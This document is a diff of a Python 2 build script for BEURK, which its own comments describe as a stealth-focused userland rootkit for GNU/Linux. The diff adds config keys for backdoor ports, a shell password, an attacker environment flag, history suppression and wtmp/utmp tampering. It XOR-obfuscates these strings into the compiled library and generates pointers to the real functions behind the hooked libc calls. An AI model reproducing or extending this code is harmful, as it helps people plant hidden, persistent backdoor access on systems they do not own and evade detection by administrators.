@@ -1,8 +1,18 @@
 #!/usr/bin/env python2
 
-import sys, os
+# reconfigure beurk rootkit, given a configuration file
+# (beurk.conf by default).
+# this script is called by the provided Makefile.
+
+import sys
+import os
+import re
 import commands
-from pprint import pprint
+from glob import glob
+import ast
+
+from pprint import pprint # debug
+
 
 def help():
     """display usage help message and exit
@@ -20,7 +30,7 @@ def fatal_error(msg):
     it means that something is missing in builder's code
     and something MUST be patched
     """
-    sys.exit("[BUILDER FATAL ERROR]: %s" % msg)
+    sys.exit("%s: fatal error: %s" % (sys.argv[0], msg))
 
 if len(sys.argv) != 2:
     help()
@@ -31,11 +41,11 @@ if len(sys.argv) != 2:
 
 # special types for config var values
 def type_str(v):
-    assert str(v)
-    return str(v)
-
-def type_hidden_literal(v):
-    return type_str(v)
+    try:
+        res = str(ast.literal_eval(v))
+    except:
+        res = str(v)
+    return res
 
 def type_bool(v):
     assert v.lower() in ["true", "false"]
@@ -52,16 +62,29 @@ def type_hexbyte(v):
 # the list of config keys (with their associated expected type)
 CONFIG_KEYS = {
         "LIBRARY_NAME": type_str,
+        "INSTALL_DIR": type_str,
         "DEBUG_LEVEL": type_int,
-        "DEBUG_FILE": type_hidden_literal,
-        "ENABLE_PTRACE": type_bool,
-        "ENABLE_PAM": type_bool,
-        "ENABLE_PCAP": type_bool,
-        "ENABLE_SSL": type_bool,
-        "CC": type_str,
+        "DEBUG_FILE": type_str,
         "XOR_KEY": type_hexbyte,
-        "MAGIC_STRING": type_hidden_literal,
-        "PAM_USER": type_hidden_literal,
+        "MAGIC_STRING": type_str,
+        "PAM_USER": type_str,
+        "LOW_BACKDOOR_PORT": type_int,
+        "HIGH_BACKDOOR_PORT": type_int,
+        "SHELL_PASSWORD": type_str,
+        "SHELL_MOTD": type_str,
+        "SHELL_TYPE": type_str,
+        "_ENV_IS_ATTACKER": type_str,
+        "_ENV_NO_HISTFILE": type_str,
+        "_ENV_XTERM": type_str,
+        "HIDDEN_ENV_VAR": type_str,
+        "_UTMP_FILE": type_str,
+        "_WTMP_FILE": type_str,
+        "PROC_PATH": type_str,
+        "MAX_LEN": type_int,
+        "ENV_LINE": type_str,
+        "PROC_NET_TCP": type_str,
+        "PROC_NET_TCP6": type_str,
+        "SCANF_FMT": type_str,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -123,9 +146,29 @@ if ret == 0:
 
 
 ###############################################################################
-### generate config.h header file
+### parse function hooks infos from includes/hooks.h
 
-HEADER = """/*
+# for each hooked function, generate `REAL_<NAME>` function pointer macro.
+function_hooks = []
+regex = re.compile("^(.+)\\b(\w+)\(.*\)\s+_HOOKED\s*;\s*$")
+header = open("includes/hooks.h").read()
+header = header.replace("\\\n", "").splitlines()
+header = [l for l in header if not l.startswith("#") and "_HOOKED" in l]
+
+for line in header:
+    try:
+        match = list(regex.match(line).groups())
+        assert len(match) == 2
+    except:
+        continue
+    match[0] = " ".join(match[0].split())
+    function_hooks.append(match)
+
+
+###############################################################################
+### generate includes/config.h and src/config.c
+
+CONFIG_H = """/*
  * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
  * Copyright (C) 2015  unix-thrust
  *
@@ -147,15 +190,63 @@ HEADER = """/*
 
 #pragma once
 
+#ifndef _CONFIG_H_
+# define _CONFIG_H_
+
+# include <stdlib.h>
+
+/* common macros from beurk config file */
+%(common_macros)s
+
+/* store hidden (XORed) literals */
+# define NUM_LITERALS (%(num_literals)d)
+# define MAX_LITERAL_SIZE (%(max_literal_size)d)
+extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];
+
+/* store real function pointers (hooks fallbacks) */
+# define NUM_HOOKS (%(num_hooks)d)
+ssize_t (*__non_hooked_symbols[NUM_HOOKS])();
+
+/* hidden literals and function pointers */
+%(literals_macros)s
+
+#endif /* _CONFIG_H_ */
+"""
+
+CONFIG_C = """/*
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
+ *
+ * This file is part of BEURK.
+ *
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * BEURK is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include "config.h"
+
+ char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
+    %(literals)s
+};
+
 """
 
 
-# add all config vars to header
+# add all config vars to header (common_macros)
 # (except for type_str and type_hidden_literal)
-macros = ""
+common_macros = ""
 macro_tpl = "#define %(key)s (%(value)s)\n"
 for key, _type in CONFIG_KEYS.items():
-    if _type in [type_str, type_hidden_literal]:
+    if _type == type_str:
         continue
     value = config[key]
     if _type == type_int:
@@ -166,61 +257,59 @@ for key, _type in CONFIG_KEYS.items():
         value = int(value)
     else:
         fatal_error("no determined action for %r" %  _type.__name__)
-    macros += macro_tpl % {"key": key, "value": value}
-
-HEADER += macros
+    common_macros += macro_tpl % {"key": key, "value": value}
 
 
 # add hidden literals to config.h
-
-def xor(string):
+def xor(string, key):
     """xor (obfuscate) given string with XOR_KEY config var
     """
-    key = config["XOR_KEY"]
     result = "{"
     for char in string:
         result += "%s, " % hex(ord(char) ^ key)
     result += "0x00},"
     return result
 
-literals_code = """
-#define NUM_LITERALS (%(num_literals)d)
-#define MAX_LITERAL_SIZE (%(max_literal_size)d)
-
-static char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE] = {
-    %(literals)s
-};
-
-%(literals_macros)s
-"""
+xor_key = 0x00 if config["DEBUG_LEVEL"] else config["XOR_KEY"]
 
 literals = []
-literals_macros = []
 max_literal_size = 0
 num_literals = 0
-macro_tpl = "#define %s ((const char *)(__hidden_literals[%d]))"
 
+# add `hidden_literal` types to the list of literals
+literals_macros = []
+macro_tpl = "#define %s ((char * const)(__hidden_literals[%d]))"
 for key, _type in CONFIG_KEYS.items():
-    if _type != type_hidden_literal:
+    if _type != type_str:
         continue
     value = config[key]
-    literals.append(xor(value))
+    literals.append(xor(value, xor_key))
     literals_macros.append(macro_tpl % (key, num_literals))
     max_literal_size = max(max_literal_size, len(value))
     num_literals += 1
 
+# add `function_hooks` names to the list of literals
+macro_tpl = "#define REAL_%s(args...) ((%s)((__non_hooked_symbols[%d])(args)))"
+num_hooks = 0
+for _type, name in function_hooks:
+    literals.append(xor(name, xor_key))
+    literals_macros.append(macro_tpl % (name.upper(), _type, num_hooks))
+    max_literal_size = max(max_literal_size, len(name))
+    num_literals += 1
+    num_hooks += 1
 max_literal_size += 1
 
-HEADER += literals_code % {
-        "literals": "\n    ".join(literals),
+CONFIG_H %= {
+        "common_macros": common_macros,
         "max_literal_size": max_literal_size + 1,
         "num_literals": num_literals,
+        "num_hooks": len(function_hooks),
         "literals_macros": "\n".join(literals_macros),
         }
 
-
-# write HEADER into config.h
-open("includes/config.h", 'w').write(HEADER)
+CONFIG_C %= {
+        "literals": "\n    ".join(literals),
+        }
 
 
 ###############################################################################
@@ -251,61 +340,29 @@ def check_lib_dependencies(*checklibs):
     return False if missing_deps else True
 
 checklibs = []
-if config["ENABLE_PCAP"]:
-    checklibs.append("libpcap")
-if config["ENABLE_PAM"]:
-    checklibs.append("libpam")
-if config["ENABLE_SSL"]:
-    checklibs.append("libssl")
+checklibs.append("libpcap")
+checklibs.append("libpam")
+checklibs.append("libssl")
 
 if not check_lib_dependencies(*checklibs):
     abort("missing dependencies")
 
-
 ###############################################################################
-### compile library
+### generate includes/config.h and src/config.c
 
-def run_build_command(cmd):
-    """function which runs a build shell command
-    """
-    cmd = cmd.format(**config)
-    print(cmd)
-    if os.system(cmd) != 0:
-        abort("build command failed")
+def update_file(filename, content):
+    if os.path.isfile(filename):
+        with open(filename) as file:
+            old_content = file.read()
+        action = "updated"
+    else:
+        old_content = ""
+        action = "created"
+    if old_content != content:
+        open(filename, 'w').write(content)
+        print("%s: %r correctly %s" % (sys.argv[0], filename, action))
 
-SOURCES = [
-        "src/beurk.c",
-        ]
-
-config["CFLAGS"] = """
--Iincludes -Wall -Wextra
--Wdisabled-optimization -Winline
--Wunsuffixed-float-constants
--Wdouble-promotion -Wunknown-pragmas
--Wno-unknown-warning-option
--mtune=native
-""".replace("\n", " ")
-
-config["LDFLAGS"] = "-lc -ldl -lutil "
-if config["ENABLE_PAM"]:
-    config["LDFLAGS"] += "-lpam "
-
-# build objects from sources
-for source in SOURCES:
-    dest = source.replace(".c", ".o")
-    run_build_command("{CC} {CFLAGS} -fPIC -g -c %s -o %s" % (source, dest))
-
-# build library from objects
-objects = " ".join([x.replace(".c", ".o") for x in SOURCES])
-
-if "unknown option" in commands.getoutput("ld -soname /dev/null").lower():
-    set_ld_soname = ""
-else:
-    set_ld_soname = "-Wl,-soname,{LIBRARY_NAME} ".format(**config)
-
-run_build_command("{CC} -fPIC -shared " + set_ld_soname \
-        + objects + " {LDFLAGS} -o {LIBRARY_NAME}")
-
-# strip if no debug mode
-if config["DEBUG_LEVEL"] == 0:
-    run_build_command("strip {LIBRARY_NAME}")
+# write CONFIG_H into includes/config.h
+update_file("includes/config.h", CONFIG_H)
+# write CONFIG_C into src/config.c
+update_file("src/config.c", CONFIG_C)
